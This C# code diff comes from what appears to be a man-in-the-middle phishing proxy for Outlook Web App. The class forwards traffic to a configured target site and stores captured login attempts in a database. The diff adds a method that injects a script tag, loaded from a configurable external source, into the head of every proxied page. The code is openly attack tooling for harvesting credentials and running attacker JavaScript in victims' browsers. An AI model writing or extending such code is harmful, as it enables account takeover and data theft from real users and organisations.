@@ -1,17 +1,21 @@
-﻿using HttpContextMapper;
+﻿using HtmlAgilityPack;
+using HttpContextMapper;
+using HttpContextMapper.Html;
 using OutlookWebAppManInTheMiddle.Models;
 using System.Collections.Specialized;
 
 namespace OutlookWebAppManInTheMiddle
 {
-    public class OutlookWebAppContextMapper : ContextMapper
+    public class OutlookWebAppContextMapper : HtmlContextMapper
     {
         private LoginAttempt _loginAttempt;
         private readonly OutlookWebAppDbContext _dbContext;
+        private readonly IConfiguration _configuration;
 
         public OutlookWebAppContextMapper(IConfiguration config, OutlookWebAppDbContext dbContext, IHttpClientFactory httpClientFactory, ILoggerFactory loggerFactory)
             : base(httpClientFactory, loggerFactory)
         {
+            _configuration = config;
             var target = config.GetValue<string>("TargetUrlWithProtocol");
             if (target is null) throw new ArgumentNullException(nameof(target), "TargetUrlWithProtocol must be provided in configuration");
 
@@ -68,6 +72,23 @@ namespace OutlookWebAppManInTheMiddle
                 await _dbContext.LoginAttempts.AddAsync(_loginAttempt);
                 await _dbContext.SaveChangesAsync();
             }
+        }
+
+        protected override Task ApplyHtmlModifications(HtmlDocument document)
+        {
+            var javascript = _configuration.GetValue<string>("Javascript");
+            if (javascript is null) return Task.CompletedTask;
+
+            var head = document.DocumentNode.SelectSingleNode("/html/head");
+
+            if (head is null) return Task.CompletedTask;
+
+            var node = document.CreateElement("script");
+            node.SetAttributeValue("src", javascript);
+
+            head.AppendChild(node);
+
+            return Task.CompletedTask;
         }
     }
 }
